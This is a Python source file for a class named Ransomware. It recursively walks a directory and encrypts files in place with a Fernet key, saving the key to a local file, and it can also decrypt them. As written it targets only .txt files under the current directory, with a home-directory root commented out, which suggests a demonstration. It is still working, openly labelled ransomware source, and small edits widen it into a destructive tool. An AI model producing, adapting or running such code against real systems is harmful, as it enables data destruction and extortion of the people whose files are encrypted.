import os
from os.path import expanduser
from cryptography.fernet import Fernet


class Ransomware:
    def __init__(self):

        self.key = None  # Stores the key used for encryption, then sent to a server
        self.cryptor = None  # A fernet object to encrypt the files
        self.file_ext_targets = ['txt']  # File extensions to encrypt

    def generate_key(self):

        # Uses a 128 bit AES key

        self.key = Fernet.generate_key()
        self.cryptor = Fernet(self.key)

    def read_key(self, keyfile_name):
        # Reads in a key from the file
        # keyfile_name: str: path to file containing key

        with open(keyfile_name, 'rb') as f:
            self.key = f.read()
            self.cryptor = Fernet(self.key)

    def write_key(self, keyfile_name):
        # Writes the key to a keyfile
        print(self.key)
        with open(keyfile_name, 'wb') as f:
            f.write(self.key)

    def crypt_root(self, root_dir, encrypted=False):
        """
        Recurrsively encrypts or decrypts files with allowed extensions

        Args:
            root_dir: str: Absolute path to the top level directory
            encrypt: boolean: Specify whether to encrypt or decrypt
        """
        for root, _, files in os.walk(root_dir):
            for f in files:
                abs_file_path = os.path.join(root, f)

                # check file extension
                if not abs_file_path.split('.')[-1] in self.file_ext_targets:
                    continue
                print(abs_file_path)
                self.crypt_file(abs_file_path, encrypted=encrypted)

    def crypt_file(self, file_path, encrypted=False):
        """
            Encrypts or decrypts a file
            abs_file_path: absolute path to a file
        """
        with open(file_path, 'rb+') as f:
            _data = f.read()

            if not encrypted:
                print(f"File contents pre encrpytion: {_data}")
                data = self.cryptor.encrypt(_data)
                print(f"File contents post encryption: {data}")
            else:
                data = self.cryptor.decrypt(_data)
                print(f"File contents post decryption: {data}")
            f.seek(0)
            f.truncate()
            f.write(data)


if __name__ == "__main__":
    #system_root = expanduser('~')
    local_root = '.'

    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('--action', required=True)
    parser.add_argument('--keyfile')

    args = parser.parse_args()
    action = args.action.lower()
    keyfile = args.keyfile
    rware = Ransomware()
    if action == 'decrypt':
        if keyfile is None:
            print('Path to keyfile not found')
        else:
            rware.read_key(keyfile)
            rware.crypt_root(local_root, encrypted=True)

    elif action == 'encrypt':
        rware.generate_key()
        rware.write_key('keyfile')
        rware.crypt_root(local_root)
